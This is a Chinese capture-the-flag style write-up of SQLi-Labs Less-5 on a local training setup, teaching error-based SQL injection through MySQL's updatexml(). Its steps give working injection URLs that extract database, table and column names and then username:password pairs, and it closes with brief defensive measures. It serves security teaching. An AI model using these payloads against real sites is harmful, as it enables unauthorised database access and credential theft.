【SQLi-Labs】Less-5 报错注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.23 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, MySQL, 报错注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-5 (GET - Double Injection - Single Quotes - String)
  • 提示：GET请求，双注入（报错注入），单引号闭合

2. 解题思路与核心原理

本关卡属于分水岭，页面不再回显数据库的查询结果（只显示 "You are in........"），因此前四关使用的 UNION SELECT 联合查询失效。但页面依然会抛出详细的 SQL 语法错误。此时需采用 报错注入（Error-based Injection） 技术，利用 MySQL 的 XML 处理函数（如 updatexml() 或 extractvalue()），故意制造非法参数错误，将查询结果拼接在报错信息中输出。

报错注入核心函数解析：

  • updatexml(目标XML文档, XPath路径, 替换内容)：用于更新 XML 文档。其第二个参数要求必须是合法的 XPath 路径格式。如果传入非法字符（如 ~），数据库会抛出 XPATH syntax error 错误，且会将非法字符原样打印在错误信息中。
  • concat(str1, str2, ...)：字符串拼接函数。
  • 0x7e：十六进制编码，对应字符 ~。用于在报错信息中界定数据边界，防止截断并方便识别。
  • 报错长度限制：MySQL 的报错信息最多只显示 32 个字符。若查询数据过长，需借助 substr() 函数分段截取，或使用自动化脚本遍历提取。

3. 操作步骤与解析

第一步：探测注入点与闭合方式

输入 URL：http://localhost/sqli-labs-master/Less-5/?id=1'

回显现象：页面抛出 SQL 语法错误，提示 near ''1'' LIMIT 0,1'。

解释与原理：确认存在单引号字符型注入。使用 ?id=1' --+ 可正常回显，确认闭合成功。

验证回显点：

输入 URL：http://localhost/sqli-labs-master/Less-5/?id=-1' UNION SELECT 1,2,3 --+

回显现象：页面仅显示 You are in........，未显示数字 2 和 3。

解释与原理：确认页面不存在回显点，联合查询无法将数据输出到前端。转入报错注入路线。

第二步：利用 updatexml 爆出数据库名

输入 URL：http://localhost/sqli-labs-master/Less-5/?id=1' AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+

回显现象：页面报错：XPATH syntax error: '~security~'。

解释与原理：通过 concat 将波浪号和库名拼接，强行作为 XPath 路径传入，触发报错并回显当前库名 security。

第三步：利用 updatexml 爆出表名

输入 URL：http://localhost/sqli-labs-master/Less-5/?id=1' AND updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e), 1) --+

回显现象：页面报错：XPATH syntax error: '~emails,referrers,uagents,users~'。

解释与原理：将联合查询中的 SELECT 语句作为子查询嵌入到 updatexml 的参数中。group_concat() 用于将多行表名合并输出。

第四步：利用 updatexml 爆出列名

输入 URL：http://localhost/sqli-labs-master/Less-5/?id=1' AND updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'), 0x7e), 1) --+

回显现象：页面报错：XPATH syntax error: '~id,username,password~'。

第五步：提取最终数据（触发截断）

输入 URL：http://localhost/sqli-labs-master/Less-5/?id=1' AND updatexml(1, concat(0x7e, (select group_concat(username, 0x3a, password) from security.users), 0x7e), 1) --+

回显现象：页面报错：XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'。

解释与原理：0x3a 代表冒号，用于格式化输出。由于报错信息存在 32 字符的物理截断限制，数据未能完整显示。

4. 踩坑记录与复盘

  • 无回显导致的失效：观察到 UNION SELECT 无效后，必须立刻切换攻击思路，不可死磕。
  • 数据截断问题：报错注入天然存在长度限制。在实战（如 HVV）中，若需获取大量数据，必须结合 substr() 函数进行分段截取（如 substr((select ...), 1, 32)），或编写 Python 脚本进行自动化循环提取，亦或尝试寻找其他回显点配合联合查询。

5. 知识点总结与工具说明

  • 报错注入（Error-based Injection）：适用于页面无回显但抛出详细 SQL 错误的场景，是 CTF 和实战中重要的数据提取手段。
  • 防御手段：蓝方若关闭详细错误回显（display_errors = Off）、使用预编译（Parameterized Queries）或部署 WAF 拦截敏感字符，可有效防御或阻断报错注入。
  • 工具环境：当前阶段仍为纯手工注入。后续遇到需要使用 Python 编写自动化报错截取脚本时，将在此处详细记录代码编写过程及逻辑解析。
